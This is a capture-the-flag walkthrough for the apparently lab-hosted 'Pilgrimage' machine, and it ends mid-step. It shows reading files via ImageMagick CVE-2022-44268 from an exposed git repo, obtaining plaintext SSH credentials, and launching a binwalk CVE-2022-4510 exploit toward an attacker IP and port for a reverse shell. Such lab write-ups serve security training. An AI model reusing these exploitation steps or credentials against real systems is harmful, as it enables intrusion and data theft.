

## Intro


Tags: #linux #WebApp #git #codereview #OSCPpath #3rd-party-vuln-app #easy 

------------
# Reconnaissance

#### Add machine to `/etc/hosts`
```shell
echo '10.129.24.53 pilgrimage.htb' | sudo tee -a /etc/hosts
```
## Port scan
### Identify open TCP ports fast
```shell
sudo nmap -p- --open -sS --min-rate 5000 -Pn -n  pilgrimage.htb
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-17 12:57 -0400
Nmap scan report for pilgrimage.htb (10.129.24.53)
Host is up (0.054s latency).
Not shown: 65358 closed tcp ports (reset), 175 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 14.66 seconds
```

### Scan specific open TCP ports
```shell
sudo nmap -p22,80 -A pilgrimage.htb
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-17 12:58 -0400
Nmap scan report for pilgrimage.htb (10.129.24.53)
Host is up (0.053s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Pilgrimage - Shrink Your Images
|_http-server-header: nginx/1.18.0
| http-git: 
|   10.129.24.53:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   54.09 ms 10.10.14.1
2   54.39 ms pilgrimage.htb (10.129.24.53)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.75 seconds
```

## WebApp

![](MediaFiles/Pasted%20image%2020260617195808.png)

### Directories

```shell
dirsearch -u http://pilgrimage.htb// -x 403,404
```

```shell

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/ch3ckm8/Downloads/reports/http_pilgrimage.htb/___26-06-17_12-59-48.txt

Target: http://pilgrimage.htb/

[12:59:48] Starting: /
[12:59:50] 301 -  169B  - //.git  ->  http://pilgrimage.htb/.git/           
[12:59:50] 200 -    2KB - //.git/COMMIT_EDITMSG                             
[12:59:50] 200 -   92B  - //.git/config
[12:59:50] 200 -   23B  - //.git/HEAD                                       
[12:59:50] 200 -   73B  - //.git/description
[12:59:50] 200 -    4KB - //.git/index                                      
[12:59:50] 200 -  240B  - //.git/info/exclude                               
[12:59:50] 301 -  169B  - //.git/logs/refs  ->  http://pilgrimage.htb/.git/logs/refs/
[12:59:50] 200 -  195B  - //.git/logs/HEAD
[12:59:50] 200 -  195B  - //.git/logs/refs/heads/master                     
[12:59:50] 301 -  169B  - //.git/logs/refs/heads  ->  http://pilgrimage.htb/.git/logs/refs/heads/
[12:59:50] 200 -   41B  - //.git/refs/heads/master                          
[12:59:50] 301 -  169B  - //.git/refs/heads  ->  http://pilgrimage.htb/.git/refs/heads/
[12:59:50] 301 -  169B  - //.git/refs/tags  ->  http://pilgrimage.htb/.git/refs/tags/
[13:00:04] 301 -  169B  - //assets  ->  http://pilgrimage.htb/assets/       
[13:00:09] 302 -    0B  - //dashboard.php  ->  /login.php                   
[13:00:18] 200 -    6KB - //login.php                                       
[13:00:18] 302 -    0B  - //logout.php  ->  /                               
[13:00:26] 200 -    6KB - //register.php                                    
[13:00:33] 301 -  169B  - //tmp  ->  http://pilgrimage.htb/tmp/             
                                                                             
Task Completed   
```

`http://pilgrimage.htb/.git/COMMIT_EDITMSG`
```shell
Pilgrimage image shrinking service initial commit.
# Please enter the commit message for your changes. Lines starting
# with '#' will be ignored, and an empty message aborts the commit.
#
# Author:    emily <emily@pilgrimage.htb>
#
# On branch master
#
# Initial commit
#
# Changes to be committed:
#	new file:   assets/bulletproof.php
#	new file:   assets/css/animate.css
#	new file:   assets/css/custom.css
#	new file:   assets/css/flex-slider.css
#	new file:   assets/css/fontawesome.css
#	new file:   assets/css/owl.css
#	new file:   assets/css/templatemo-woox-travel.css
#	new file:   assets/images/banner-04.jpg
#	new file:   assets/images/cta-bg.jpg
#	new file:   assets/js/custom.js
#	new file:   assets/js/isotope.js
#	new file:   assets/js/isotope.min.js
#	new file:   assets/js/owl-carousel.js
#	new file:   assets/js/popup.js
#	new file:   assets/js/tabs.js
#	new file:   assets/webfonts/fa-brands-400.ttf
#	new file:   assets/webfonts/fa-brands-400.woff2
#	new file:   assets/webfonts/fa-regular-400.ttf
#	new file:   assets/webfonts/fa-regular-400.woff2
#	new file:   assets/webfonts/fa-solid-900.ttf
#	new file:   assets/webfonts/fa-solid-900.woff2
#	new file:   assets/webfonts/fa-v4compatibility.ttf
#	new file:   assets/webfonts/fa-v4compatibility.woff2
#	new file:   dashboard.php
#	new file:   index.php
#	new file:   login.php
#	new file:   logout.php
#	new file:   magick
#	new file:   register.php
#	new file:   vendor/bootstrap/css/bootstrap.min.css
#	new file:   vendor/bootstrap/js/bootstrap.min.js
#	new file:   vendor/jquery/jquery.js
#	new file:   vendor/jquery/jquery.min.js
#	new file:   vendor/jquery/jquery.min.map
#	new file:   vendor/jquery/jquery.slim.js
#	new file:   vendor/jquery/jquery.slim.min.js
#	new file:   vendor/jquery/jquery.slim.min.map
#
```
#### Git directory found
interesting, found a valid user from above snippet: `emily` 
Four our convenience, lets use `git-dumper`
```shell
git-dumper http://pilgrimage.htb/.git git
```

also found a file called magick, running strings revealed nothing interesting and also while running it this is shown:
```shell
└─$ ./magick
dlopen(): error loading libfuse.so.2

AppImages require FUSE to run. 
You might still be able to extract the contents of this AppImage 
if you run it with the --appimage-extract option. 
See https://github.com/AppImage/AppImageKit/wiki/FUSE 
for more information
```
running it with specified option creates a new dir
```shell
─$ cd squashfs-root/                                                                                                     

┌──(ch3ckm8㉿kali)-[~/Downloads/squashfs-root]
└─$ ls                                                                                                                    
AppRun  imagemagick.desktop  imagemagick.png  usr

```
lets print the version
#### 3rd party app discovered
```shell
└─$ ./AppRun --version                                                                                                    
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
```

------------
# Foothold

## Exploiting vulnerable 3rd party app's version 

Lets find exploits for that version
```shell
searchsploit ImageMagick 7.1.0-49

└─$ searchsploit ImageMagick 7.1.0-49                                                                                     
---------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                          |  Path
---------------------------------------------------------------------------------------- ---------------------------------
ImageMagick 7.1.0-49 - Arbitrary File Read                                              | multiple/local/51261.txt
ImageMagick 7.1.0-49 - DoS                                                              | php/dos/51256.txt
---------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

┌──(ch3ckm8㉿kali)-[~/Downloads/squashfs-root]
└─$ searchsploit -m 51261
  Exploit: ImageMagick 7.1.0-49 - Arbitrary File Read
      URL: https://www.exploit-db.com/exploits/51261
     Path: /usr/share/exploitdb/exploits/multiple/local/51261.txt
    Codes: CVE-2022-44268
 Verified: False
File Type: ASCII text
Copied to: /home/ch3ckm8/Downloads/squashfs-root/51261.txt
```

found this
https://nvd.nist.gov/vuln/detail/cve-2022-44268
with poc: 
https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC?source=post_page-----ae6533d425d5---------------------------------------
Following the poc:
first find any png image to provide it
```shell
└─$ pngcrush -text a "profile" "/etc/passwd" image.png                                                                    
  Recompressing IDAT chunks in image.png to pngout.png
   Total length of data found in critical chunks            =    534107
   Best pngcrush method        =   5 (ws 15 fm 1 zl 9 zs 1) =    522982
CPU time decode 0.078588, encode 0.407155, other 0.049675, total 0.676451 sec
```

```shell
└─$ exiv2 -pS pngout.png                                                                                                  
STRUCTURE OF PNG FILE: pngout.png
 address | chunk |  length | data                           | checksum
       8 | IHDR  |      13 | ............                   | 0x147062b9
      33 | gAMA  |       4 | ....                           | 0x0bfc6105
      49 | cHRM  |      32 | ..z&..............u0...`..:..  | 0x9cba513c
      93 | bKGD  |       6 | ......                         | 0xa0bda793
     111 | IDAT  |  522925 | x.|.w.diy...i..U'..y.3.."I..I. | 0x2ecede15
  523048 | tEXt  |      37 | date:create.2019-12-07T01:15:5 | 0xe9392e92
  523097 | tEXt  |      37 | date:modify.2019-12-07T01:15:3 | 0xc9948e80
  523146 | tEXt  |      19 | profile./etc/passwd            | 0x465bd758
  523177 | IEND  |       0 |   
```

now upload pngout to the web app and download the "shrunken" image
![](MediaFiles/Pasted%20image%2020260617202045.png)
```shell
http://pilgrimage.htb/shrunk/6a32d75f8f065.png
```
download it
```shell
└─$ wget http://pilgrimage.htb/shrunk/6a32d75f8f065.png                                                                   
--2026-06-17 13:21:06--  http://pilgrimage.htb/shrunk/6a32d75f8f065.png
Resolving pilgrimage.htb (pilgrimage.htb)... 10.129.24.53
Connecting to pilgrimage.htb (pilgrimage.htb)|10.129.24.53|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 129736 (127K) [image/png]
Saving to: ‘6a32d75f8f065.png’

6a32d75f8f065.png              100%[==================================================>] 126.70K   730KB/s    in 0.2s    

2026-06-17 13:21:06 (730 KB/s) - ‘6a32d75f8f065.png’ saved [129736/129736
```
lets view the contents of the file read and decrypt output via python 
```shell
identify -verbose 6a32d75f8f065.png
```

```shell
└─$ identify -verbose 6a32d75f8f065.png                                                                                   
Image:
  Filename: 6a32d75f8f065.png
  Permissions: rw-rw-r--
  Format: PNG (Portable Network Graphics)
  Mime type: image/png
  Class: DirectClass
  Geometry: 320x213+0+0
  Units: Undefined
  Colorspace: sRGB
  Type: TrueColor
  Endianness: Undefined
  Depth: 8-bit
  Channels: 3.0
  Channel depth:
    Red: 8-bit
    Green: 8-bit
    Blue: 8-bit
  Channel statistics:
    Pixels: 68160
    Red:
      min: 0  (0)
      max: 255 (1)
      mean: 112.011 (0.439258)
      median: 102 (0.4)
      standard deviation: 73.8474 (0.289598)
      kurtosis: -1.13008
      skewness: 0.326741
      entropy: 0.98677
    Green:
      min: 0  (0)
      max: 255 (1)
      mean: 92.9343 (0.364448)
      median: 85 (0.333333)
      standard deviation: 59.0271 (0.231479)
      kurtosis: -0.661618
      skewness: 0.487928
      entropy: 0.962778
    Blue:
      min: 0  (0)
      max: 255 (1)
      mean: 110.277 (0.43246)
      median: 120 (0.470588)
      standard deviation: 72.0017 (0.28236)
      kurtosis: -1.20974
      skewness: -0.0951147
      entropy: 0.968861
  Image statistics:
    Overall:
      min: 0  (0)
      max: 255 (1)
      mean: 105.074 (0.412055)
      median: 102.333 (0.401307)
      standard deviation: 68.2921 (0.267812)
      kurtosis: -1.00048
      skewness: 0.239852
      entropy: 0.972803
  Rendering intent: Perceptual
  Gamma: 0.45455
  Chromaticity:
    red primary: (0.64,0.33,0.03)
    green primary: (0.3,0.6,0.1)
    blue primary: (0.15,0.06,0.79)
    white point: (0.3127,0.329,0.3583)
  Matte color: grey74
  Background color: white
  Border color: srgb(223,223,223)
  Transparent color: black
  Interlace: None
  Intensity: Undefined
  Compose: Over
  Page geometry: 320x213+0+0
  Dispose: Undefined
  Iterations: 0
  Compression: Zip
  Orientation: Undefined
  Properties:
    date:create: 2026-06-17T17:21:06+00:00
    date:modify: 2026-06-17T17:20:31+00:00
    date:timestamp: 2026-06-17T17:21:33+00:00
    png:bKGD: chunk was found (see Background color, above)
    png:cHRM: chunk was found (see Chromaticity, above)
    png:gAMA: gamma=0.45455 (See Gamma, above)
    png:IHDR.bit-depth-orig: 8
    png:IHDR.bit_depth: 8
    png:IHDR.color-type-orig: 2
    png:IHDR.color_type: 2 (Truecolor)
    png:IHDR.interlace_method: 0 (Not interlaced)
    png:IHDR.width,height: 320, 213
    png:text: 4 tEXt/zTXt/iTXt chunks were found
    png:tIME: 2026-06-17T17:20:31Z
    Raw profile type: 

    1437
726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d
6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f
6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e
2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f736269
6e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f
62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d
65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a
2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a
783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f
6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f757372
2f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73
706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31
303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f
6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573
722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d
646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b
75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f
7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c69
7374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67
696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f73
62696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d
5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e
6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a3635353334
3a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e
2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374
656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f72
6b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d65
6e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e
0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d642052
65736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f
6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e65786973
74656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573
796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e69
7a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c
6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d
652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a78
3a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f
7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f
737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a393938
3a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a

    signature: 93938281b7bbcf4eb1b18c861534020e9d2fae12598f595e13d97205548bf839
  Artifacts:
    verbose: true
  Tainted: False
  Filesize: 129736B
  Number pixels: 68160
  Pixel cache type: Memory
  Pixels per second: 21.6953MP
  User time: 0.000u
  Elapsed time: 0:01.003
  Version: ImageMagick 7.1.2-23 Q16 x86_64 24055 https://imagemagick.org

```

```shell
python3 -c 'print(bytes.fromhex("726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f7362696e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f7573722f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c697374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f7362696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a36353533343a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f726b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d656e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d64205265736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e697a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a783a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a3939383a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a").decode("utf-8"))'
```
great! the output is the content of `/etc/passwd`
```shell
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false

```
From the downloaded git directory, lets search for mysqlite database indicators
```shell
grep -aRi "sqlite" -C2
```
found database name:
```shell
/var/db/pilgrimage
```
now lets write the exploit again, but instead of `/etc/passwd` i read the sqlite databse file. 

then dump contents of file
```shell
sqlite3 pilgrimage.sqlite .dump
```
#### creds obtained
found user creds:
```shell
emily
abigchonkyboi123
```

## Shell as emily

grabbed user flag
```shell
└─$ ssh emily@pilgrimage.htb
The authenticity of host 'pilgrimage.htb (10.129.24.53)' can't be established.
ED25519 key fingerprint is: SHA256:uaiHXGDnyKgs1xFxqBduddalajktO+mnpNkqx/HjsBw
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'pilgrimage.htb' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
emily@pilgrimage.htb's password: 
Linux pilgrimage 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
emily@pilgrimage:~$ cat user.txt
315ef433aeb781f98d5978da9c3b4a6f
emily@pilgrimage:~$ 
```

----------
# Privesc

## sudo -l
```shell
emily@pilgrimage:~$ sudo -l
[sudo] password for emily: 
Sorry, user emily may not run sudo on pilgrimage.
```

## Services run as root

```shell
ps aux | grep root
```

```shell
root         669  0.0  0.0   6816  2988 ?        Ss   02:55   0:00 /bin/bash /usr/sbin/malwarescan.sh
root         673  0.0  0.6 209752 26852 ?        Ss   02:55   0:00 php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf)
root         678  0.0  0.1 220796  6156 ?        Ssl  02:55   0:00 /usr/sbin/rsyslogd -n -iNONE
root         681  0.0  0.0      0     0 ?        I<   02:55   0:00 [ttm_swap]
root         682  0.0  0.0      0     0 ?        S    02:55   0:00 [card0-crtc0]
root         683  0.0  0.0      0     0 ?        S    02:55   0:00 [card0-crtc1]
root         685  0.0  0.0      0     0 ?        S    02:55   0:00 [card0-crtc2]
root         687  0.0  0.0      0     0 ?        S    02:55   0:00 [card0-crtc3]
root         689  0.0  0.0      0     0 ?        S    02:55   0:00 [card0-crtc4]
root         690  0.0  0.0      0     0 ?        S    02:55   0:00 [card0-crtc5]
root         691  0.0  0.0      0     0 ?        S    02:55   0:00 [card0-crtc6]
root         692  0.0  0.0      0     0 ?        S    02:55   0:00 [card0-crtc7]
root         699  0.0  0.1  13856  7032 ?        Ss   02:55   0:00 /lib/systemd/systemd-logind
root         709  0.0  0.0   2516   776 ?        S    02:55   0:00 /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/
root         710  0.0  0.0   6816  2124 ?        S    02:55   0:00 /bin/bash /usr/sbin/malwarescan.sh
root         724  0.0  0.1  13352  7756 ?        Ss   02:55   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root         725  0.0  0.0   5844  1664 tty1     Ss+  02:55   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root         784  0.0  0.1  99884  5644 ?        Ssl  02:55   0:00 /sbin/dhclient -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root         805  0.0  0.0  56376  1628 ?        Ss   02:55   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
root         976  0.0  0.0      0     0 ?        I    03:09   0:01 [kworker/1:0-events]
root         979  0.0  0.0      0     0 ?        I    03:09   0:00 [kworker/u256:0-events_unbound]
root         986  0.0  0.0      0     0 ?        I    03:13   0:00 [kworker/0:0-events]
root        1024  0.0  0.0      0     0 ?        I    03:20   0:00 [kworker/1:1-rcu_par_gp]
root        1026  0.0  0.2  14508  8796 ?        Ss   03:30   0:00 sshd: emily [priv]
root        1030  0.0  0.0      0     0 ?        I    03:30   0:00 [kworker/u256:1-events_unbound]
root        1034  0.0  0.0      0     0 ?        I    03:30   0:00 [kworker/0:2]
root        1054  0.0  0.0      0     0 ?        I    03:31   0:00 [kworker/u256:2]
emily       1059  0.0  0.0   6240   708 pts/0    S+   03:32   0:00 grep root
```
from all the above, this caught my attention `/usr/sbin/malwarescan.sh`

### Code review
lets investigate it:
```shell
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done
```
also
```shell
emily@pilgrimage:/usr/sbin$ ls -la | grep malwarescan.sh 
-rwxr--r--  1 root root       474 Jun  1  2023 malwarescan.sh
```
This means that this script is only `writable by root` !

okay and if we go to this dir above we see the previously shrunk image we used earlier
```shell
emily@pilgrimage:~$ cd /var/www/pilgrimage.htb/shrunk/
emily@pilgrimage:/var/www/pilgrimage.htb/shrunk$ ls
6a32d75f8f065.png
emily@pilgrimage:/var/www/pilgrimage.htb/shrunk$ ls -la
total 136
drwxrwxrwx 2 root     root       4096 Jun 18 03:20 .
drwxr-xr-x 7 root     root       4096 Jun  8  2023 ..
-rw-r--r-- 1 www-data www-data 129736 Jun 18 03:20 6a32d75f8f065.png
```
Looking again at the code tho, i found this line interesting
```shell
/usr/local/bin/binwalk -e $filename
```
which in the script takes the shrunked image as parameter

#### 3rd party app (Binwalk)

Lets view the binwalk version
```shell
emily@pilgrimage:/usr/sbin$ binwalk

Binwalk v2.3.2
```
#### Vulnerable version
found exploit for it
```shell
└─$ searchsploit binwalk 2.3.2
----------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                           |  Path
----------------------------------------------------------------------------------------- ---------------------------------
Binwalk v2.3.2 - Remote Command Execution (RCE)                                          | python/remote/51249.py
----------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
└─$ searchsploit -m 51249
  Exploit: Binwalk v2.3.2 - Remote Command Execution (RCE)
      URL: https://www.exploit-db.com/exploits/51249
     Path: /usr/share/exploitdb/exploits/python/remote/51249.py
    Codes: CVE-2022-4510
 Verified: False
File Type: ASCII text, with very long lines (614)
Copied to: /home/ch3ckm8/Downloads/squashfs-root/51249.py
```
### Exploitation

```shell
└─$ python 51249.py image.png 10.10.14.148 4444

################################################
------------------CVE-2022-4510----------------
################################################
--------Binwalk Remote Command Execution--------
------Binwalk 2.1.2b through 2.3.2 included-----
------------------------------------------------
################################################
----------Exploit by: Etienne Lacoche-----------
---------Contact Twitter: @electr0sm0g----------
------------------Discovered by:----------------
---------Q. Kaiser, ONEKEY Research Lab---------
---------Exploit tested on debian 11------------
################################################


You can now rename and share binwalk_exploit and start your local netcat listener.
```
tried it but didnt work in the end, then tried this one 
https://github.com/electr0sm0g/CVE-2022-4510/blob/main/RCE_Binwalk.py
executed it from inside the target:
```shell
nano exp.py
touch image.png
python3 exp.py image.png 10.10.14.148 4445

You can now rename and share binwalk_exploit and start your local netcat listener.

cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/
```
alternatively i could have transfered it on target 
```shell
python3 -m http.server 9001
```
now go to the directory of the shrunk images
```shell
